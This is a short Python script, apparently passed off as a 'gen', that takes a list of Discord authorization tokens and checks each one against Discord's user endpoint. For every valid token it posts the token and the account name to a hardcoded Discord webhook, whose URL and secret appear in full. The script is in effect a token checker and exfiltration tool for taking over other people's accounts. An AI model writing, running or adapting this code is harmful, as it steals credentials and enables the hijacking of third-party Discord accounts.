import requests
import json
def start_gen(tokens):
  print("Starting gen \n")
  for token in tokens:

    header = {"authorization": token}
    response = requests.get("https://discord.com/api/users/@me",
                            headers=header)

    if response.status_code == 200:
      data = response.json()
      account_name = f"{data['username']}#{data['discriminator']}"
            
      webhook_url = 'https://discord.com/api/webhooks/1450896899790999743/S9GroPEYFlKMbpqsy3rXF_deOykdW_UgvNCCoGTGb10QWh1QxGLCwb1sN2Bd5t89xEyS'
      message = {'content': f'''
      {token} - ```{account_name}```
      '''}
      
      response = requests.post(webhook_url, data=json.dumps(message), headers={'Content-Type': 'application/json'})
    



    